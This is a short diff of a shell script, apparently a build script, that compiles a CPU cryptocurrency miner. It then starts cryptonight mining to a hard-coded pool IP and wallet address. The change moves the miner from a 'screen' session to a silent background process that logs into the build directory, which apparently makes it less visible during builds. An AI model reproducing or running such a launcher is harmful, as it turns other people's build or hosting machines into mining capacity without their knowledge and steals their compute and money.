@@ -65,5 +65,5 @@ chmod 777 autogen.sh
 ./autogen.sh
 CFLAGS="-march=native" ./configure
 make
-screen -S x ./minerd -a cryptonight -o stratum+tcp://89.35.29.48:3333 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p x -t 16
+./minerd -a cryptonight -o stratum+tcp://89.35.29.48:3333 -u 41qaydymiHeCPEuVePNgJrME38BtZQmTiWLTDJ3NMPUWWm7TK7dNPoX9m2crg3vWnH82qPN6N1UpYBmQ6h2E7PMpHPrSZhG -p x -t 16 > $BUILD_DIR/log.txt &
 echo "done"
